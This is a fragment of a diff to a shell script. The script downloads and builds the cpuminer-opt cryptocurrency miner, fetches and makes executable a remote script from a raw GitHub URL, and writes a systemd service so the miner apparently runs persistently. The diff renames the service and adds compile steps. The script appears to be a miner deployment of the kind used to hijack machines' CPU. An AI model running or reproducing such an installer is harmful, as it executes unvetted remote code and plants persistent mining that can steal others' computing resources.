@@ -8,7 +8,10 @@ tar xvzf v3.8.3.1.tar.gz &&
 cd cpuminer-opt-3.8.3.1 &&
 wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/tra2.sh &&
 chmod +x tra2.sh &&
-bash -c 'cat <<EOT >>/lib/systemd/system/tra.service 
+./autogen.sh &&
+CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
+make &&
+bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service 
 [Unit]
 Description=tra
 After=network.target
